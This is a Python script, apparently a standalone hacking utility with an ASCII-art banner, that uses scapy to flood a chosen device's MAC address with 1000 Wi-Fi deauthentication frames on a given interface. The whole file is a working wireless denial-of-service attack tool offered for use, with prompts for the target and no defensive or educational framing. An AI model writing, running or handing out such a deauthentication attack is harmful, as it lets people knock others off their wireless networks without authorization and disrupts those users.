import scapy.all as scapy
from re import compile
from util import question, out, shader, lbl

logo = """
                                                  
                                                +%%%                                                
                                               %%%*%%                                               
                                               %%%%%%  %%                                           
                                      %%%%%%%  %%%%%%  %%%%%%%%                                     
                                  %%%%%%%%%%%  %%%%%%  %%%%%%%%%%#%                                 
                               %%%%%%%%%#      #%%%%%       %%%%%%%%%%                              
                            #%%%%%%%           %%%%%%           %%%%%%%%                            
                          %%%%%%%              %%%%%%              %%%%%%%                          
                         %%%%%%           #%%% %%%%%%  %%%           *%%%%%                         
                          %%%         %%%%%%%% #%%%%%  %%%%%%%         -%%                          
                                   #%%%%%%%%%   %%%%%  %%%%%%%%%%                                   
                                 #%%%%%%%       %*%%#       %%%%%%%                                 
                                *%%%%%          %%%%%         #%%%%%                                
                                 #%%            %%%%%           #%%                                 
                                           %%%  %%%%% %%%%                                          
                                        #%%%%%  %%%%% #%%%%%                                        
                                        %%%%%   %%%%   %%%%%%                                       
                                         %%              +%*                                        
                                                                                                    
                                               %%%%%%                                               
                                              %%%%%%%%                                              
                                              #%%%%%%%                                              
                                               #%%#%%                                               
"""


def send_deauth_packet(target_mac, interface):
    dot11 = scapy.Dot11(addr1=target_mac, addr2='ff:ff:ff:ff:ff:ff', addr3=target_mac) # type: ignore
    deauth = scapy.Dot11Deauth() # type: ignore
    packet = dot11 / deauth

    scapy.sendp(packet, iface=interface, count=1000, inter=0.1)
    out("info", f"Sent deauth packets to {target_mac} on {interface}")
    
def validate_mac(mac):
    pattern = compile("([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})")
    return pattern.fullmatch(mac) is not None   

def main():
    target_mac = question("Enter the target MAC address", "xx:xx:xx:xx:xx:xx")
    if not validate_mac(target_mac):
        out("error", "Invalid MAC address format. Please use xx:xx:xx:xx:xx:xx.")
        return

    interface = question("Enter the interface to use", "en0, wlan0, etc")
    if not interface:
        out("error", "No valid interface provided.")
        interface = "wlan0"  

    send_deauth_packet(target_mac, interface)

if __name__ == '__main__':
    lbl(shader(logo), 0.0625)
    print("\n")
    main()